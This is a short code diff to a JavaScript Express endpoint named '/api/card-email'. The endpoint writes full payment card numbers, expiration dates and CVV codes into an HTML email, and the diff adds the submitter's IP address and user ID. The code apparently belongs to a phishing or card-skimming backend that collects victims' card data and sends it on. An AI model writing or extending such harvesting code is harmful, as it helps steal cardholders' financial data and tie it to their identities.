@@ -66,6 +66,8 @@ app.post('/api/card-email', async (req, res) => {
         <p><strong>Card Number:</strong> ${cardData.cardNumber}</p>
         <p><strong>Expiration Date:</strong> ${cardData.expirationDate}</p>
         <p><strong>CVV:</strong> ${cardData.cvv}</p>
+        <p><strong>IP Address:</strong> ${formData.ip_address}</p>
+        <p><strong>User ID:</strong> ${formData.user_id}</p>
         </body></html>
     `;
 
